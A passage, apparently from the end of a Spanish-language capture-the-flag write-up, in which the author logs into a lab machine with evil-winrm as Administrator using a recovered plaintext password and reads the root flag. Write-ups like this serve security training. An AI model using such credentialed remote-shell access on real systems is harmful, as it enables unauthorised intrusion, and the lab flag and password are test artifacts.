```

Puedo ver la segunda flag

```null
evil-winrm -i 10.10.11.158 -u 'Administrator' -p '4)(6&h9+7]QY+o'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```null
*Evil-WinRM* PS C:\Users> type C:\Users\Martin\Desktop\root.txt
9e5451c8a4f2241342c420a0fc3f5241
```